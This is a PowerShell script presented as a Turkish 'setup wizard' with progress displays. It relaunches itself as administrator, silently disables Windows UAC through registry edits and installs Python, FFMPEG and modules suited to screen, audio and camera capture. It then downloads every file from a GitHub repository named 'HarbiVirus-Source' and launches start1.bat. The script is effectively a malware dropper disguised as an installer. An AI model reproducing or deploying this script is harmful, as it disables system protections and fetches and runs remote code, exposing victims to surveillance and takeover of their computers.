
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $scriptPath = $PSCommandPath
    $workingDir = (Get-Item -Path ".\").FullName
    Start-Process -FilePath "powershell" `
        -ArgumentList '-ExecutionPolicy','Bypass','-File',"`"$scriptPath`"",'-WorkingDirectory',"`"$workingDir`"" `
        -Verb RunAs
    exit
}


try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
} catch {
    Write-Host "[!] UAC devre dışı bırakılamadı: $_" -ForegroundColor Red
}


$scriptPath = $MyInvocation.MyCommand.Path
$scriptDir = Split-Path -Parent $scriptPath
Set-Location -Path $scriptDir


function Show-ProgressBar {
    param(
        [int]$Percent,
        [string]$Status,
        [int]$BarSize = 50
    )
    
    $filled = [math]::Round($BarSize * ($Percent / 100))
    $empty = $BarSize - $filled
    $bar = "[" + ("█" * $filled) + ("░" * $empty) + "]"
    Write-Host "`r$bar $Percent% $Status" -NoNewline
}

function Update-Progress {
    param(
        [string]$Task,
        [int]$Percent,
        [string]$Status
    )
    
    if (-not $global:ProgressTracker) {
        $global:ProgressTracker = @{}
    }
    
    $global:ProgressTracker[$Task] = @{
        Percent = $Percent
        Status = $Status
    }
    
    Update-Display
}

function Update-Display {
    Clear-Host
    Write-Host @"
=======================================
        KURULUM SİHİRBAZI v3.0
=======================================

"@


    $totalTasks = $global:ProgressTracker.Count
    $sum = 0
    $completedTasks = 0
    
    foreach ($task in $global:ProgressTracker.Keys) {
        $progress = $global:ProgressTracker[$task]
        $sum += $progress.Percent
        if ($progress.Percent -eq 100) { $completedTasks++ }
    }
    
    $overallPercent = if ($totalTasks -gt 0) { [math]::Round($sum / $totalTasks) } else { 0 }
    $overallBar = "[" + ("█" * [math]::Round(20 * ($overallPercent / 100))) + ("░" * (20 - [math]::Round(20 * ($overallPercent / 100)))) + "]"
    
    Write-Host "GENEL İLERLEME: $overallBar $overallPercent% ($completedTasks/$totalTasks görev tamamlandı)"
    Write-Host "---------------------------------------`n"
    

    Write-Host "GÖREV BAZLI İLERLEME"
    Write-Host "----------------------------"
    foreach ($task in $global:ProgressTracker.Keys) {
        $progress = $global:ProgressTracker[$task]
        $percent = $progress.Percent
        $status = $progress.Status
        
        $filled = [math]::Round(20 * ($percent / 100))
        $empty = 20 - $filled
        $bar = "[" + ("█" * $filled) + ("░" * $empty) + "]"
        
        Write-Host "$task".PadRight(25) + "$bar $percent% $status"
    }
    

    $logSummary = $global:Logs -join " | "
    

    $downloadSummary = if ($global:DownloadedItems.Count -gt 0) {
        $global:DownloadedItems -join ", "
    } else {
        "Henüz dosya indirilmedi"
    }
    

    $errorSummary = if ($global:Errors.Count -gt 0) {
        $global:Errors -join " | "
    } else {
        "Hata yok"
    }
    
    Write-Host @"

LOGLAR
----------------------------
$logSummary

İNDİRİLEN DOSYALAR
----------------------------
$downloadSummary

HATALAR
----------------------------
$errorSummary

=======================================
"@
}


$global:Logs = New-Object System.Collections.ArrayList
$global:DownloadedItems = New-Object System.Collections.ArrayList
$global:Errors = New-Object System.Collections.ArrayList
$global:ProgressTracker = @{}

function Add-Log($message) {
    $timestamp = Get-Date -Format "HH:mm:ss"
    $logEntry = "[$timestamp] $message"
    $global:Logs.Add($logEntry) | Out-Null
    Update-Display
}

function Add-Download($item) {
    $global:DownloadedItems.Add($item) | Out-Null
    Update-Display
}

function Add-Error($errorMsg) {
    $global:Errors.Add($errorMsg) | Out-Null
    Update-Display
}


Update-Progress -Task "Admin Yetkileri" -Percent 100 -Status "✓ Tamamlandı"
Add-Log "Admin yetkisi alındı, sistem kontrol ediliyor..."


Update-Progress -Task "Chocolatey" -Percent 0 -Status "Kontrol ediliyor..."
if (Get-Command choco -ErrorAction SilentlyContinue) {
    Update-Progress -Task "Chocolatey" -Percent 100 -Status "✓ Zaten yüklü"
    Add-Log "[✓] Chocolatey zaten yüklü."
} else {
    Update-Progress -Task "Chocolatey" -Percent 10 -Status "İndiriliyor..."
    try {
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        

        $ProgressPreference = 'SilentlyContinue'
        $installScript = "$env:TEMP\install_choco.ps1"
        Invoke-WebRequest -Uri 'https://community.chocolatey.org/install.ps1' -OutFile $installScript
        

        Update-Progress -Task "Chocolatey" -Percent 80 -Status "Kuruluyor..."
        & $installScript
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        
        Update-Progress -Task "Chocolatey" -Percent 100 -Status "✓ Kuruldu"
        Add-Log "[✓] Chocolatey başarıyla kuruldu."
    } catch {
        Update-Progress -Task "Chocolatey" -Percent 100 -Status "✗ Hata"
        Add-Error "[!] Chocolatey kurulum hatası: $_"
    }
}


Update-Progress -Task "VC++ Build Tools" -Percent 0 -Status "Kontrol ediliyor..."
$vcInstalled = $false
$checks = @(
    { Get-Command cl.exe -ErrorAction SilentlyContinue },
    { Test-Path "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe" },
    { Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\VisualStudio\SxS\VS7" -ErrorAction SilentlyContinue }
)

foreach ($check in $checks) {
    if (& $check) {
        $vcInstalled = $true
        break
    }
}

if ($vcInstalled) {
    Update-Progress -Task "VC++ Build Tools" -Percent 100 -Status "✓ Zaten yüklü"
    Add-Log "[✓] Visual C++ Build Tools zaten yüklü."
} else {
    Update-Progress -Task "VC++ Build Tools" -Percent 10 -Status "Kurulum hazırlanıyor..."
    try {
        $vcUrl = "https://aka.ms/vs/17/release/vs_buildtools.exe"
        $vcInstaller = "$env:TEMP\vs_buildtools.exe"
        

        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $vcUrl -OutFile $vcInstaller
        

        Update-Progress -Task "VC++ Build Tools" -Percent 60 -Status "Kuruluyor..."
        $installArgs = @(
            "--quiet", "--norestart", "--wait",
            "--add", "Microsoft.VisualStudio.Workload.VCTools",
            "--includeRecommended"
        )
        $process = Start-Process -FilePath $vcInstaller -ArgumentList $installArgs -PassThru -WindowStyle Hidden -Wait
        
        if ($process.ExitCode -eq 0 -or $process.ExitCode -eq 3010) {
            Update-Progress -Task "VC++ Build Tools" -Percent 100 -Status "✓ Kuruldu"
            Add-Log "[✓] Visual C++ Build Tools kuruldu."
        } else {
            Update-Progress -Task "VC++ Build Tools" -Percent 100 -Status "✗ Hata kodu: $($process.ExitCode)"
            Add-Error "[!] VC++ kurulum hata kodu: $($process.ExitCode)"
        }
    } catch {
        Update-Progress -Task "VC++ Build Tools" -Percent 100 -Status "✗ Hata"
        Add-Error "[!] VC++ kurulum hatası: $_"
    }
}


Update-Progress -Task "Python" -Percent 0 -Status "Kontrol ediliyor..."
if (Get-Command python -ErrorAction SilentlyContinue) {
    Update-Progress -Task "Python" -Percent 100 -Status "✓ Zaten yüklü"
    Add-Log "[✓] Python zaten yüklü."
} else {
    Update-Progress -Task "Python" -Percent 10 -Status "İndiriliyor..."
    try {
        $pythonUrl = "https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe"
        $installer = "$env:TEMP\python_installer.exe"
        
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $pythonUrl -OutFile $installer
        
        Update-Progress -Task "Python" -Percent 60 -Status "Kuruluyor..."
        $installDir = "$env:LocalAppData\Programs\Python\Python312"
        $process = Start-Process -FilePath $installer -ArgumentList "/quiet", "InstallAllUsers=0", "PrependPath=1", "TargetDir=$installDir" -PassThru -WindowStyle Hidden -Wait
        
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        Update-Progress -Task "Python" -Percent 100 -Status "✓ Kuruldu"
        Add-Log "[✓] Python yüklendi: $installDir"
    } catch {
        Update-Progress -Task "Python" -Percent 100 -Status "✗ Hata"
        Add-Error "[!] Python kurulum hatası: $_"
    }
}


Update-Progress -Task "Pip Güncelleme" -Percent 0 -Status "Başlatılıyor..."
try {
    python -m pip install --upgrade pip | Out-Null
    Update-Progress -Task "Pip Güncelleme" -Percent 100 -Status "✓ Tamamlandı"
    Add-Log "[✓] Pip başarıyla güncellendi"
} catch {
    Update-Progress -Task "Pip Güncelleme" -Percent 100 -Status "✗ Hata"
    Add-Error "[!] Pip güncelleme hatası: $_"
}


Update-Progress -Task "Python Modülleri" -Percent 0 -Status "Hazırlanıyor..."
$modules = @(
    "requests", "six", "urllib3", "psutil", "pillow", 
    "opencv-python", "numpy", "sounddevice", "ffmpeg-python", 
    "pycaw", "comtypes", "simpleaudio", "pydub", "pywin32", 
    "winregistry", "mss", "PyQt5"
)

$total = $modules.Count
$completed = 0
foreach ($module in $modules) {
    $percent = [math]::Round(($completed / $total) * 100)
    Update-Progress -Task "Python Modülleri" -Percent $percent -Status "$module kuruluyor..."
    
    try {
        pip install $module | Out-Null
        $completed++
        Add-Log "[✓] $module modülü kuruldu"
    } catch {
        Add-Error "[!] $module kurulum hatası: $_"
    }
}
Update-Progress -Task "Python Modülleri" -Percent 100 -Status "✓ $total modül kuruldu"


Update-Progress -Task "FFMPEG" -Percent 0 -Status "Kontrol ediliyor..."
if (Get-Command ffmpeg -ErrorAction SilentlyContinue) {
    Update-Progress -Task "FFMPEG" -Percent 100 -Status "✓ Zaten yüklü"
    Add-Log "[✓] FFMPEG zaten yüklü"
} else {
    Update-Progress -Task "FFMPEG" -Percent 10 -Status "İndiriliyor..."
    try {
        $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
        $zipPath = "$env:TEMP\ffmpeg.zip"
        $extractPath = "$env:LocalAppData\ffmpeg"
        

        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $ffmpegUrl -OutFile $zipPath
        Add-Download "ffmpeg.zip"
        

        Update-Progress -Task "FFMPEG" -Percent 60 -Status "Dosyalar çıkarılıyor..."
        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
        

        $binPath = Get-ChildItem "$extractPath\ffmpeg-master-latest-win64-gpl\bin" | 
            Select-Object -First 1 -ExpandProperty FullName
        
        $env:Path += ";$binPath"
        [Environment]::SetEnvironmentVariable("Path", $env:Path, "User")
        Update-Progress -Task "FFMPEG" -Percent 100 -Status "✓ Kuruldu"
        Add-Log "[✓] FFMPEG kuruldu: $binPath"
    } catch {
        Update-Progress -Task "FFMPEG" -Percent 100 -Status "✗ Hata"
        Add-Error "[!] FFMPEG kurulum hatası: $_"
    }
}


Update-Progress -Task "GitHub Dosyaları" -Percent 0 -Status "Hazırlanıyor..."
try {
    $repoUrl = "https://api.github.com/repos/UnknownDestroyer2/HarbiVirus-Source/contents/"
    $headers = @{ "User-Agent" = "PowerShellSetupScript" }
    $response = Invoke-RestMethod -Uri $repoUrl -Headers $headers
    $files = $response | Where-Object { $_.type -eq "file" }
    $totalFiles = $files.Count
    $downloadedCount = 0
    
    foreach ($file in $files) {
        $fileName = $file.name
        $downloadUrl = $file.download_url
        $percent = [math]::Round(($downloadedCount / $totalFiles) * 100)
        Update-Progress -Task "GitHub Dosyaları" -Percent $percent -Status "$fileName indiriliyor..."
        
        try {
            $ProgressPreference = 'SilentlyContinue'
            $outputPath = Join-Path $scriptDir $fileName
            Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath
            
            Add-Download $fileName
            $downloadedCount++
        } catch {
            Add-Error "[!] $fileName indirilemedi: $_"
        }
    }
    Update-Progress -Task "GitHub Dosyaları" -Percent 100 -Status "✓ $downloadedCount/$totalFiles dosya indirildi"
} catch {
    Update-Progress -Task "GitHub Dosyaları" -Percent 100 -Status "✗ Hata"
    Add-Error "[!] GitHub erişim hatası: $_"
}


Update-Progress -Task "Son İşlemler" -Percent 0 -Status "Başlatılıyor..."
try {
    Start-Process "start1.bat" -WorkingDirectory $scriptDir
    Update-Progress -Task "Son İşlemler" -Percent 100 -Status "✓ Tamamlandı"
    Add-Log "[✓] Ana script başlatıldı"
} catch {
    Update-Progress -Task "Son İşlemler" -Percent 100 -Status "✗ Hata"
    Add-Error "[!] Script başlatma hatası: $_"
}

Update-Display
Write-Host "`n`n[KURULUM TAMAMLANDI] Enter'a basarak çıkın..."
Read-Host
